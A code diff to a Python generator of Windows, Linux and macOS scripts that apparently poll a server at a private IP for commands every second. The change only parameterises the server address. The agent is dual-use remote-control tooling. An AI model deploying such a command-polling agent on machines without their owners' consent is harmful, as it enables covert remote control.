@@ -1,6 +1,8 @@
+serverIP = "10.125.37.96"
+
 def windows_command(uid: int):
     return """
-$serverUrl = "http://10.125.37.96:8000/api/agent_server/agent_server"
+$serverUrl = "http://{serverIP}:8000/api/agent_server/agent_server"
 
 function Get-Commands {{
     try {{
@@ -124,12 +126,12 @@ while ($true) {{
     }} 
     Start-Sleep -Seconds 1
 }}
-""".format(uid=uid)
+""".format(uid=uid, serverIP=serverIP)
 
 
 def linux_command(uid: int):
     return """
-serverUrl="http://10.125.37.96:8000/api/agent_server/agent_server"
+serverUrl="http://{serverIP}:8000/api/agent_server/agent_server"
 
 get_commands() {{
     hostname=$(hostname)
@@ -211,11 +213,11 @@ while true; do
     
     sleep 1
 done
-""".format(uid=uid)
+""".format(uid=uid, serverIP=serverIP)
 
 def mac_command(uid: int):
     return """
-serverUrl="http://10.125.37.96:8000/api/agent_server/agent_server"
+serverUrl="http://{serverIP}:8000/api/agent_server/agent_server"
 
 get_commands() {{
     hostname=$(hostname)
@@ -297,4 +299,4 @@ while true; do
     
     sleep 1
 done
-""".format(uid=uid)
+""".format(uid=uid, serverIP=serverIP)
